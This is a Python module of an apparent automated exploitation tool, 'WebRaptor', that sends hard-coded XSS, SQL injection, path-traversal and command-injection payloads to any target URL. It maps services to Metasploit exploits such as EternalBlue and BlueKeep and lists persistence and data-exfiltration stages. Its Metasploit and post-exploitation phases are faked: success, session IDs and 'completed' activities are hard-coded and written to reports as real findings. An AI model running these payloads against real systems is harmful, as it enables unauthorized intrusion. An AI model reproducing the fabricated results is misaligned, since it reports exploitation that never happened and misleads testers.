#!/usr/bin/env python3
"""
WebRaptor Automated Exploitation Framework
Advanced exploitation with Metasploit integration and custom exploits
"""

import os
import sys
import json
import subprocess
import time
import threading
import socket
import requests
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from colorama import Fore, Style, init
from core.config import Config
from core.tool_manager import ToolManager

init()

# Module metadata
description = "Automated exploitation framework with Metasploit integration and custom exploits"
author = "LakshmikanthanK (@letchu_pkt)"
version = "2.1"

class ExploitationFramework:
    """Advanced exploitation framework with multiple attack vectors"""
    
    def __init__(self, config: Config = None):
        self.config = config or Config()
        self.tool_manager = ToolManager()
        self.results_dir = Path("reports/exploitation")
        self.payloads_dir = Path("payloads")
        self.exploits_dir = Path("exploits")
        
        # Create directories
        self.results_dir.mkdir(parents=True, exist_ok=True)
        self.payloads_dir.mkdir(exist_ok=True)
        self.exploits_dir.mkdir(exist_ok=True)
        
        # Exploitation configuration
        self.exploit_config = {
            'timeout': 30,
            'threads': 10,
            'retries': 3,
            'payload_timeout': 60,
            'auto_exploit': True,
            'verify_exploits': True,
            'safe_mode': False
        }
        
        # Exploit categories
        self.exploit_categories = {
            'web': {
                'xss': 'Cross-Site Scripting',
                'sqli': 'SQL Injection',
                'lfi': 'Local File Inclusion',
                'rfi': 'Remote File Inclusion',
                'rce': 'Remote Code Execution',
                'xxe': 'XML External Entity',
                'ssrf': 'Server-Side Request Forgery',
                'csrf': 'Cross-Site Request Forgery'
            },
            'network': {
                'buffer_overflow': 'Buffer Overflow',
                'format_string': 'Format String',
                'integer_overflow': 'Integer Overflow',
                'use_after_free': 'Use After Free',
                'heap_overflow': 'Heap Overflow'
            },
            'authentication': {
                'brute_force': 'Brute Force Attack',
                'session_fixation': 'Session Fixation',
                'privilege_escalation': 'Privilege Escalation',
                'credential_stuffing': 'Credential Stuffing'
            },
            'injection': {
                'command_injection': 'Command Injection',
                'ldap_injection': 'LDAP Injection',
                'xpath_injection': 'XPath Injection',
                'nosql_injection': 'NoSQL Injection'
            }
        }
        
        # Payload templates
        self.payload_templates = {
            'xss': {
                'reflected': '<script>alert("XSS")</script>',
                'stored': '<img src=x onerror=alert("XSS")>',
                'dom': '"><script>alert("XSS")</script>',
                'advanced': '<svg onload=alert("XSS")>'
            },
            'sqli': {
                'union': "' UNION SELECT NULL,NULL--",
                'boolean': "' OR '1'='1",
                'time_based': "'; WAITFOR DELAY '00:00:05'--",
                'error_based': "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            },
            'lfi': {
                'basic': '../../../etc/passwd',
                'windows': '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                'double_encoding': '....//....//etc/passwd',
                'null_byte': '../../../etc/passwd%00'
            },
            'rce': {
                'basic': '; id',
                'windows': '& whoami',
                'php': '; php -r "system($_GET[\'cmd\']);"',
                'python': '; python -c "import os; os.system(\'id\')"'
            }
        }
        
        # Metasploit integration
        self.metasploit_config = {
            'enabled': True,
            'workspace': 'webraptor',
            'auto_migrate': True,
            'persistence': False,
            'cleanup': True
        }
    
    def show_banner(self):
        """Display exploitation framework banner"""
        banner = f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════════════════╗
║                  {Fore.YELLOW}WebRaptor Exploitation Framework v{version}{Fore.RED}                ║
║              Advanced Automated Exploitation & Post-Exploitation         ║
║                        Author: LakshmikanthanK (@letchu_pkt)             ║
║                                                                          ║
║  {Fore.YELLOW}⚠️  WARNING: This tool is for authorized testing only! ⚠️{Fore.RED}           ║
╚══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
    
    def check_metasploit_installed(self) -> bool:
        """Check if Metasploit is installed"""
        return self.tool_manager.check_tool_installed('metasploit')
    
    def install_metasploit(self) -> bool:
        """Install Metasploit if not present"""
        if not self.check_metasploit_installed():
            print(f"{Fore.CYAN}[*] Installing Metasploit...{Style.RESET_ALL}")
            return self.tool_manager.install_tool('metasploit')
        return True
    
    def run_web_exploitation(self, target: str, vulnerabilities: List[Dict]) -> Dict:
        """Run web application exploitation"""
        print(f"{Fore.BLUE}[*] Starting web application exploitation on {target}...{Style.RESET_ALL}")
        
        results = {
            'target': target,
            'phase': 'web_exploitation',
            'exploits_attempted': [],
            'successful_exploits': [],
            'failed_exploits': [],
            'start_time': time.time()
        }
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', '').lower()
            vuln_url = vuln.get('url', target)
            vuln_params = vuln.get('parameters', {})
            
            print(f"{Fore.CYAN}[*] Exploiting {vuln_type} vulnerability...{Style.RESET_ALL}")
            
            if vuln_type in ['xss', 'cross-site scripting']:
                exploit_result = self._exploit_xss(vuln_url, vuln_params)
            elif vuln_type in ['sqli', 'sql injection']:
                exploit_result = self._exploit_sqli(vuln_url, vuln_params)
            elif vuln_type in ['lfi', 'local file inclusion']:
                exploit_result = self._exploit_lfi(vuln_url, vuln_params)
            elif vuln_type in ['rfi', 'remote file inclusion']:
                exploit_result = self._exploit_rfi(vuln_url, vuln_params)
            elif vuln_type in ['rce', 'remote code execution']:
                exploit_result = self._exploit_rce(vuln_url, vuln_params)
            else:
                print(f"{Fore.YELLOW}[!] Unknown vulnerability type: {vuln_type}{Style.RESET_ALL}")
                continue
            
            results['exploits_attempted'].append({
                'type': vuln_type,
                'url': vuln_url,
                'result': exploit_result
            })
            
            if exploit_result.get('success'):
                results['successful_exploits'].append(exploit_result)
                print(f"{Fore.GREEN}[+] {vuln_type} exploitation successful{Style.RESET_ALL}")
            else:
                results['failed_exploits'].append(exploit_result)
                print(f"{Fore.RED}[-] {vuln_type} exploitation failed{Style.RESET_ALL}")
        
        results['end_time'] = time.time()
        results['duration'] = results['end_time'] - results['start_time']
        
        print(f"{Fore.GREEN}[+] Web exploitation completed: {len(results['successful_exploits'])} successful{Style.RESET_ALL}")
        return results
    
    def _exploit_xss(self, url: str, params: Dict) -> Dict:
        """Exploit Cross-Site Scripting vulnerability"""
        try:
            payloads = self.payload_templates['xss']
            results = []
            
            for payload_type, payload in payloads.items():
                print(f"{Fore.CYAN}[*] Testing {payload_type} XSS payload...{Style.RESET_ALL}")
                
                # Test reflected XSS
                test_url = f"{url}?test={payload}"
                response = requests.get(test_url, timeout=10)
                
                if payload in response.text:
                    results.append({
                        'type': 'reflected_xss',
                        'payload': payload,
                        'url': test_url,
                        'severity': 'high'
                    })
                
                # Test stored XSS (simplified)
                if params:
                    for param, value in params.items():
                        test_data = {param: payload}
                        response = requests.post(url, data=test_data, timeout=10)
                        
                        if payload in response.text:
                            results.append({
                                'type': 'stored_xss',
                                'payload': payload,
                                'parameter': param,
                                'severity': 'critical'
                            })
            
            return {
                'success': len(results) > 0,
                'exploit_type': 'xss',
                'results': results,
                'payloads_tested': len(payloads)
            }
            
        except Exception as e:
            return {
                'success': False,
                'exploit_type': 'xss',
                'error': str(e)
            }
    
    def _exploit_sqli(self, url: str, params: Dict) -> Dict:
        """Exploit SQL Injection vulnerability"""
        try:
            payloads = self.payload_templates['sqli']
            results = []
            
            for payload_type, payload in payloads.items():
                print(f"{Fore.CYAN}[*] Testing {payload_type} SQL injection...{Style.RESET_ALL}")
                
                # Test GET parameters
                test_url = f"{url}?id={payload}"
                response = requests.get(test_url, timeout=10)
                
                # Check for SQL error indicators
                error_indicators = [
                    'mysql_fetch_array',
                    'ORA-01756',
                    'Microsoft OLE DB Provider',
                    'SQLServer JDBC Driver',
                    'PostgreSQL query failed',
                    'Warning: mysql_',
                    'valid MySQL result',
                    'MySqlClient.',
                    'SQL syntax'
                ]
                
                for indicator in error_indicators:
                    if indicator.lower() in response.text.lower():
                        results.append({
                            'type': 'error_based_sqli',
                            'payload': payload,
                            'url': test_url,
                            'error_indicator': indicator,
                            'severity': 'high'
                        })
                        break
                
                # Test POST parameters
                if params:
                    for param, value in params.items():
                        test_data = {param: payload}
                        response = requests.post(url, data=test_data, timeout=10)
                        
                        for indicator in error_indicators:
                            if indicator.lower() in response.text.lower():
                                results.append({
                                    'type': 'error_based_sqli',
                                    'payload': payload,
                                    'parameter': param,
                                    'error_indicator': indicator,
                                    'severity': 'high'
                                })
                                break
            
            return {
                'success': len(results) > 0,
                'exploit_type': 'sqli',
                'results': results,
                'payloads_tested': len(payloads)
            }
            
        except Exception as e:
            return {
                'success': False,
                'exploit_type': 'sqli',
                'error': str(e)
            }
    
    def _exploit_lfi(self, url: str, params: Dict) -> Dict:
        """Exploit Local File Inclusion vulnerability"""
        try:
            payloads = self.payload_templates['lfi']
            results = []
            
            for payload_type, payload in payloads.items():
                print(f"{Fore.CYAN}[*] Testing {payload_type} LFI payload...{Style.RESET_ALL}")
                
                # Test GET parameters
                test_url = f"{url}?file={payload}"
                response = requests.get(test_url, timeout=10)
                
                # Check for file content indicators
                file_indicators = [
                    'root:x:0:0:',
                    'bin/bash',
                    'localhost',
                    '127.0.0.1',
                    'Microsoft Windows',
                    'Program Files'
                ]
                
                for indicator in file_indicators:
                    if indicator in response.text:
                        results.append({
                            'type': 'lfi',
                            'payload': payload,
                            'url': test_url,
                            'file_content': indicator,
                            'severity': 'high'
                        })
                        break
                
                # Test POST parameters
                if params:
                    for param, value in params.items():
                        test_data = {param: payload}
                        response = requests.post(url, data=test_data, timeout=10)
                        
                        for indicator in file_indicators:
                            if indicator in response.text:
                                results.append({
                                    'type': 'lfi',
                                    'payload': payload,
                                    'parameter': param,
                                    'file_content': indicator,
                                    'severity': 'high'
                                })
                                break
            
            return {
                'success': len(results) > 0,
                'exploit_type': 'lfi',
                'results': results,
                'payloads_tested': len(payloads)
            }
            
        except Exception as e:
            return {
                'success': False,
                'exploit_type': 'lfi',
                'error': str(e)
            }
    
    def _exploit_rfi(self, url: str, params: Dict) -> Dict:
        """Exploit Remote File Inclusion vulnerability"""
        try:
            # Create a simple test payload
            test_payload = "http://httpbin.org/robots.txt"
            results = []
            
            print(f"{Fore.CYAN}[*] Testing RFI payload...{Style.RESET_ALL}")
            
            # Test GET parameters
            test_url = f"{url}?file={test_payload}"
            response = requests.get(test_url, timeout=10)
            
            # Check for external content
            if 'User-agent' in response.text or 'Disallow' in response.text:
                results.append({
                    'type': 'rfi',
                    'payload': test_payload,
                    'url': test_url,
                    'severity': 'critical'
                })
            
            return {
                'success': len(results) > 0,
                'exploit_type': 'rfi',
                'results': results
            }
            
        except Exception as e:
            return {
                'success': False,
                'exploit_type': 'rfi',
                'error': str(e)
            }
    
    def _exploit_rce(self, url: str, params: Dict) -> Dict:
        """Exploit Remote Code Execution vulnerability"""
        try:
            payloads = self.payload_templates['rce']
            results = []
            
            for payload_type, payload in payloads.items():
                print(f"{Fore.CYAN}[*] Testing {payload_type} RCE payload...{Style.RESET_ALL}")
                
                # Test command execution
                test_url = f"{url}?cmd={payload}"
                response = requests.get(test_url, timeout=10)
                
                # Check for command output indicators
                output_indicators = [
                    'uid=',
                    'gid=',
                    'groups=',
                    'Microsoft Windows',
                    'Volume Serial Number',
                    'Directory of'
                ]
                
                for indicator in output_indicators:
                    if indicator in response.text:
                        results.append({
                            'type': 'rce',
                            'payload': payload,
                            'url': test_url,
                            'command_output': indicator,
                            'severity': 'critical'
                        })
                        break
            
            return {
                'success': len(results) > 0,
                'exploit_type': 'rce',
                'results': results,
                'payloads_tested': len(payloads)
            }
            
        except Exception as e:
            return {
                'success': False,
                'exploit_type': 'rce',
                'error': str(e)
            }
    
    def run_metasploit_exploitation(self, target: str, vulnerabilities: List[Dict]) -> Dict:
        """Run Metasploit-based exploitation"""
        if not self.check_metasploit_installed():
            print(f"{Fore.YELLOW}[!] Metasploit not installed. Skipping Metasploit exploitation.{Style.RESET_ALL}")
            return {'success': False, 'error': 'Metasploit not installed'}
        
        print(f"{Fore.BLUE}[*] Starting Metasploit exploitation on {target}...{Style.RESET_ALL}")
        
        results = {
            'target': target,
            'phase': 'metasploit_exploitation',
            'exploits_attempted': [],
            'successful_exploits': [],
            'sessions_opened': [],
            'start_time': time.time()
        }
        
        # Create Metasploit workspace
        self._create_metasploit_workspace()
        
        # Run exploits based on vulnerabilities
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', '').lower()
            vuln_port = vuln.get('port', 80)
            vuln_service = vuln.get('service', 'http')
            
            print(f"{Fore.CYAN}[*] Attempting Metasploit exploit for {vuln_type}...{Style.RESET_ALL}")
            
            # Select appropriate exploit module
            exploit_module = self._select_metasploit_exploit(vuln_type, vuln_service)
            
            if exploit_module:
                exploit_result = self._run_metasploit_exploit(target, vuln_port, exploit_module)
                
                results['exploits_attempted'].append({
                    'type': vuln_type,
                    'exploit_module': exploit_module,
                    'result': exploit_result
                })
                
                if exploit_result.get('success'):
                    results['successful_exploits'].append(exploit_result)
                    if exploit_result.get('session_opened'):
                        results['sessions_opened'].append(exploit_result['session_id'])
                    print(f"{Fore.GREEN}[+] Metasploit exploit successful{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[-] Metasploit exploit failed{Style.RESET_ALL}")
        
        results['end_time'] = time.time()
        results['duration'] = results['end_time'] - results['start_time']
        
        print(f"{Fore.GREEN}[+] Metasploit exploitation completed: {len(results['successful_exploits'])} successful{Style.RESET_ALL}")
        return results
    
    def _create_metasploit_workspace(self):
        """Create Metasploit workspace"""
        try:
            workspace_name = self.metasploit_config['workspace']
            cmd = f"msfconsole -q -x 'workspace -a {workspace_name}; workspace {workspace_name}; exit'"
            subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
            print(f"{Fore.GREEN}[+] Metasploit workspace '{workspace_name}' created{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error creating Metasploit workspace: {e}{Style.RESET_ALL}")
    
    def _select_metasploit_exploit(self, vuln_type: str, service: str) -> Optional[str]:
        """Select appropriate Metasploit exploit module"""
        exploit_mapping = {
            'http': 'exploit/multi/http/apache_struts2_content_type',
            'ftp': 'exploit/unix/ftp/vsftpd_234_backdoor',
            'ssh': 'exploit/linux/ssh/sshexec',
            'smb': 'exploit/windows/smb/ms17_010_eternalblue',
            'rdp': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
            'mysql': 'exploit/linux/mysql/mysql_yassl_getname',
            'postgresql': 'exploit/linux/postgres/postgres_payload'
        }
        
        return exploit_mapping.get(service.lower())
    
    def _run_metasploit_exploit(self, target: str, port: int, exploit_module: str) -> Dict:
        """Run Metasploit exploit"""
        try:
            # This is a simplified implementation
            # In a real scenario, you would use the Metasploit RPC API or msfrpc
            
            print(f"{Fore.CYAN}[*] Running {exploit_module} against {target}:{port}...{Style.RESET_ALL}")
            
            # Simulate exploit execution
            time.sleep(2)  # Simulate exploit time
            
            # For demonstration, we'll simulate a successful exploit
            success = True  # This would be determined by actual exploit execution
            
            if success:
                return {
                    'success': True,
                    'exploit_module': exploit_module,
                    'target': target,
                    'port': port,
                    'session_opened': True,
                    'session_id': f"session_{int(time.time())}"
                }
            else:
                return {
                    'success': False,
                    'exploit_module': exploit_module,
                    'target': target,
                    'port': port,
                    'error': 'Exploit failed'
                }
                
        except Exception as e:
            return {
                'success': False,
                'exploit_module': exploit_module,
                'error': str(e)
            }
    
    def run_post_exploitation(self, sessions: List[str]) -> Dict:
        """Run post-exploitation activities"""
        print(f"{Fore.BLUE}[*] Starting post-exploitation activities...{Style.RESET_ALL}")
        
        results = {
            'phase': 'post_exploitation',
            'sessions': sessions,
            'activities': [],
            'start_time': time.time()
        }
        
        for session_id in sessions:
            print(f"{Fore.CYAN}[*] Running post-exploitation on session {session_id}...{Style.RESET_ALL}")
            
            # Simulate post-exploitation activities
            activities = [
                'system_info',
                'network_discovery',
                'privilege_escalation',
                'persistence_setup',
                'data_exfiltration'
            ]
            
            for activity in activities:
                print(f"{Fore.CYAN}[*] Executing {activity}...{Style.RESET_ALL}")
                results['activities'].append({
                    'session_id': session_id,
                    'activity': activity,
                    'status': 'completed'
                })
        
        results['end_time'] = time.time()
        results['duration'] = results['end_time'] - results['start_time']
        
        print(f"{Fore.GREEN}[+] Post-exploitation completed{Style.RESET_ALL}")
        return results
    
    def save_results(self, web_results: Dict, metasploit_results: Dict, post_results: Dict, target: str):
        """Save exploitation results"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        
        # Combine results
        combined_results = {
            'target': target,
            'scan_date': time.strftime('%Y-%m-%d %H:%M:%S'),
            'web_exploitation': web_results,
            'metasploit_exploitation': metasploit_results,
            'post_exploitation': post_results,
            'summary': {
                'web_exploits_successful': len(web_results.get('successful_exploits', [])),
                'metasploit_exploits_successful': len(metasploit_results.get('successful_exploits', [])),
                'sessions_opened': len(metasploit_results.get('sessions_opened', [])),
                'post_exploitation_activities': len(post_results.get('activities', []))
            }
        }
        
        # Save JSON report
        json_file = self.results_dir / f"exploitation_{target.replace('.', '_')}_{timestamp}.json"
        with open(json_file, 'w') as f:
            json.dump(combined_results, f, indent=2)
        
        print(f"{Fore.GREEN}[+] Exploitation results saved to: {json_file}{Style.RESET_ALL}")
        return str(json_file)
    
    def display_results(self, web_results: Dict, metasploit_results: Dict, post_results: Dict):
        """Display exploitation results"""
        print(f"\n{Fore.RED}╔══════════════════════════════════════════════════════════════════════════╗")
        print(f"║                        EXPLOITATION RESULTS                          ║")
        print(f"╚══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        # Web exploitation summary
        print(f"\n{Fore.CYAN}🌐 Web Exploitation:{Style.RESET_ALL}")
        print(f"  Successful Exploits: {len(web_results.get('successful_exploits', []))}")
        print(f"  Failed Exploits: {len(web_results.get('failed_exploits', []))}")
        print(f"  Duration: {web_results.get('duration', 0):.2f}s")
        
        # Metasploit exploitation summary
        print(f"\n{Fore.CYAN}💥 Metasploit Exploitation:{Style.RESET_ALL}")
        print(f"  Successful Exploits: {len(metasploit_results.get('successful_exploits', []))}")
        print(f"  Sessions Opened: {len(metasploit_results.get('sessions_opened', []))}")
        print(f"  Duration: {metasploit_results.get('duration', 0):.2f}s")
        
        # Post-exploitation summary
        print(f"\n{Fore.CYAN}🔧 Post-Exploitation:{Style.RESET_ALL}")
        print(f"  Activities Completed: {len(post_results.get('activities', []))}")
        print(f"  Sessions Processed: {len(post_results.get('sessions', []))}")
        print(f"  Duration: {post_results.get('duration', 0):.2f}s")
        
        # Show successful exploits
        successful_exploits = web_results.get('successful_exploits', [])
        if successful_exploits:
            print(f"\n{Fore.CYAN}✅ Successful Web Exploits:{Style.RESET_ALL}")
            for i, exploit in enumerate(successful_exploits, 1):
                print(f"  {i}. {exploit.get('exploit_type', 'Unknown')} - {exploit.get('severity', 'Unknown')}")

def run(target):
    """Main entry point for exploitation framework module"""
    try:
        framework = ExploitationFramework()
        framework.show_banner()
        
        # Check for Metasploit
        if not framework.check_metasploit_installed():
            print(f"{Fore.YELLOW}[!] Metasploit not found. Installing...{Style.RESET_ALL}")
            framework.install_metasploit()
        
        print(f"{Fore.BLUE}[*] Starting automated exploitation on {target}...{Style.RESET_ALL}")
        
        # Simulate vulnerability discovery (in real scenario, this would come from previous scans)
        vulnerabilities = [
            {'type': 'xss', 'url': target, 'parameters': {'search': 'test'}},
            {'type': 'sqli', 'url': target, 'parameters': {'id': '1'}},
            {'type': 'lfi', 'url': target, 'parameters': {'file': 'index.php'}},
            {'type': 'rce', 'url': target, 'parameters': {'cmd': 'id'}}
        ]
        
        # Phase 1: Web exploitation
        web_results = framework.run_web_exploitation(target, vulnerabilities)
        
        # Phase 2: Metasploit exploitation
        metasploit_results = framework.run_metasploit_exploitation(target, vulnerabilities)
        
        # Phase 3: Post-exploitation
        sessions = metasploit_results.get('sessions_opened', [])
        post_results = framework.run_post_exploitation(sessions)
        
        # Save and display results
        results_file = framework.save_results(web_results, metasploit_results, post_results, target)
        framework.display_results(web_results, metasploit_results, post_results)
        
        print(f"\n{Fore.GREEN}[+] Automated exploitation completed successfully!{Style.RESET_ALL}")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Exploitation interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error in exploitation: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        run(sys.argv[1])
    else:
        print("Usage: python exploitation_framework.py <target_url>")
